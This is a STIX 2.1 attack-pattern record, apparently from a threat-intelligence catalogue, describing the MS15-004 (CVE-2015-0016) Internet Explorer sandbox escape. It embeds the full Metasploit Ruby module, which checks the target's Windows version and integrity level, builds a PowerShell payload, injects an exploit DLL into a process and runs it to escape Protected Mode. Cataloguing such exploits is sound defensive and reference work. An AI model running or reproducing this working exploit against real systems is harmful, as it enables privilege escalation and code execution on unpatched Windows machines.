{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1e2bc8b4-4848-4be2-9e7c-7e043312c4a4",
    "created": "2024-08-14T16:49:58.753373Z",
    "modified": "2024-08-14T16:49:58.753377Z",
    "name": "MS15-004 Microsoft Remote Desktop Services Web Proxy IE Sandbox Escape",
    "description": " This module abuses a process creation policy in Internet Explorer's sandbox; specifically, Microsoft's RemoteApp and Desktop Connections runtime proxy, TSWbPrxy.exe.  This vulnerability allows the attacker to escape the Protected Mode and execute code with Medium Integrity. At the moment, this module only bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This module has been tested successfully on Windows 7 SP1 (32 bits) with IE 8 and IE 11.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms15_004_tswbproxy.rb",
            "external_id": "ms15_004_tswbproxy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0016"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::Powershell\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS15-004 Microsoft Remote Desktop Services Web Proxy IE Sandbox Escape',\n          'Description' => %q{\n            This module abuses a process creation policy in Internet Explorer's\n            sandbox; specifically, Microsoft's RemoteApp and Desktop Connections runtime\n            proxy, TSWbPrxy.exe.  This vulnerability allows the attacker to escape the\n            Protected Mode and execute code with Medium Integrity. At the moment, this\n            module only bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This\n            module has been tested successfully on Windows 7 SP1 (32 bits) with IE 8 and IE\n            11.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Unknown', # From Threat Intel of Symantec\n            'Henry Li', # Public vulnerability analysis\n            'juan vazquez' # Metasploit module\n          ],\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'Arch' => [ARCH_X86],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread',\n            'WfsDelay' => 30\n          },\n          'Targets' => [\n            [\n              'Protected Mode (Windows 7) / 32 bits',\n              {\n                'Arch' => ARCH_X86\n              }\n            ]\n          ],\n          'DefaultTarget' => 0,\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2015-0016'],\n            ['MSB', 'MS15-004'],\n            ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/']\n          ],\n          'DisclosureDate' => '2015-01-13',\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_thread_create\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    temp = get_env('WINDIR')\n    dll_path = \"#{temp}\\\\System32\\\\TSWbPrxy.exe\"\n\n    version = get_version_info\n\n    unless version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Server2012_R2)\n      return Exploit::CheckCode::Safe\n    end\n\n    unless file_exist?(dll_path)\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    print_status('Checking target...')\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::NotVulnerable, 'System not vulnerable')\n    end\n\n    if session.arch != ARCH_X86\n      fail_with(Failure::NotVulnerable, 'Sorry, this module currently only allows x86/win32 sessions at the moment')\n    end\n\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win8, Msf::WindowsVersion::Win81)\n      fail_with(Failure::NotVulnerable, 'This module doesn\\'t run on Windows 8/2012 at the moment')\n    end\n\n    print_status('Checking the Process Integrity Level...')\n\n    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NotVulnerable, 'Not running at Low Integrity')\n    end\n\n    cmd = cmd_psh_payload(\n      payload.encoded,\n      payload_instance.arch.first,\n      { remove_comspec: true }\n    )\n\n    print_status('Storing payload on environment variable...')\n    cmd.gsub!('powershell.exe ', '')\n    session.railgun.kernel32.SetEnvironmentVariableA('PSHCMD', cmd)\n\n    print_status('Exploiting...')\n\n    process = client.sys.process.open\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0016', 'cve-2015-0016.dll')\n    print_status(\"Injecting exploit into #{process.pid}...\")\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n\n    print_status('Payload injected. Executing exploit...')\n    process.thread.create(exploit_mem + offset)\n  end\n\n  def cleanup\n    session.railgun.kernel32.SetEnvironmentVariableA('PSHCMD', nil)\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-13",
    "x_mitre_platforms": [
        "win'"
    ]
}